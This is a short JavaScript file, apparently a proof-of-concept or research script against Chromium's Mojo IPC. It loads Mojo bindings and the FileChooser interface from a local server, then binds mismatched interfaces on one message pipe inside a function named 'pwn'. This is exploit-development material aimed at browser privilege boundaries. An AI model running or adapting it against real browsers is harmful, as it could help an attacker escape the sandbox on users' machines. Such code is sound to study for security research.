function pwn() {
	var pipe = Mojo.createMessagePipe();
	Mojo.bindInterface(blink.mojom.FileChooser.name, pipe.handle1, 'context', true);
	Mojo.bindInterface('pwn', pipe.handle0, "process");
};
document.body.innerHTML = '<html><head></head><body></body></html>';
var mojo_bindings = document.createElement('script');
mojo_bindings.onload = function () {
	var fc = document.createElement('script');
	fc.onload = function() {
		pwn();
	};
	fc.src = 'https://localhost:8080/mojo/gen/third_party/blink/public/mojom/choosers/file_chooser.mojom.js';
	document.head.appendChild(fc);	
};
mojo_bindings.src = 'https://localhost:8080/mojo/mojo_bindings.js';
document.head.appendChild(mojo_bindings); 